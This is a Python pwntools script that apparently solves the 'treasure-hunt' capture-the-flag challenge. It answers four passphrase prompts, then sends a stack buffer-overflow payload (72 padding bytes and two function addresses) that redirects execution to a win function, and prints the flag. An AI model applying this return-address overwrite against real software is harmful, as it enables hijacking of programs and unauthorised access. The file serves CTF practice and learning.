#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./vuln", checksec=False)
context.binary = elf

##p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("treasure-hunt.ctf.pearlctf.in", 30008)

p.sendlineafter(b"proceed: ", b"whisp3ring_w00ds")
p.sendlineafter(b"proceed: ", b"sc0rching_dunes")
p.sendlineafter(b"proceed: ", b"eldorian_ech0")
p.sendlineafter(b"proceed: ", b"shadow_4byss")

p.readuntil(b"win:- ")

payload = b""
payload += b"A" * 0x48
payload += p64(elf.sym["setEligibility"])
payload += p64(elf.sym["winTreasure"])
p.sendline(payload)

p.readuntil(b"GGs\n")

print(p.readuntil(b"}").decode()) # pearl{k33p_0n_r3turning_l0l}
